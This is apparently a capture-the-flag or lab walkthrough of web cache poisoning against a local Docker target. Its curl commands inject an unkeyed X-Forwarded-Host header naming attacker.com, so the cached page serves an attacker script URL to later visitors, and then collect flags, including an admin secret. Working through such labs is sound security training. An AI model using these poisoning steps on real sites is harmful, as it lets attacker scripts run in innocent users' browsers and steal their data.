# Walkthrough: Web Cache Poisoning

## Setup

```bash
docker compose up --build -d
```

## Step 1: Understand Normal Cache Behavior

```bash
# First request -- cache MISS
curl -s -D - http://127.0.0.1:8094/home
# X-Cache: MISS
# script_src uses 127.0.0.1:8094

# Second request -- cache HIT
curl -s -D - http://127.0.0.1:8094/home
# X-Cache: HIT
```

Normal behavior: the cache stores the response after the first request and serves it on subsequent ones.

## Step 2: Identify the Reflected Header

```bash
curl -s -H "X-Forwarded-Host: attacker.com" http://127.0.0.1:8094/home
# {"script_src":"http://attacker.com/static/app.js","poisoned":true,...}
```

The `X-Forwarded-Host` header appears in the response body. The cache does not include it in the cache key, so this response will be stored as the canonical `/home` response.

## Step 3: Clear Cache and Poison It

```bash
curl -s -X POST http://127.0.0.1:8094/cache/clear -H "Content-Type: application/json" -d '{}'

curl -s -D - \
    -H "X-Forwarded-Host: attacker.com" \
    http://127.0.0.1:8094/home
# X-Cache: MISS
# flag1 in response body
```

The cache is now poisoned.

## Step 4: Victim Gets the Poisoned Response

```bash
curl -s -D - http://127.0.0.1:8094/home
# X-Cache: HIT
# script_src: http://attacker.com/static/app.js
```

The victim made a normal request and received a response containing the attacker's URL. They never sent `X-Forwarded-Host`.

## Step 5: Collect Flag 2

```bash
curl -s http://127.0.0.1:8094/admin
# {"note":"XSS from poisoned cache stole this","secret":"POC{...}"}
```

## Teardown

```bash
docker compose down
```
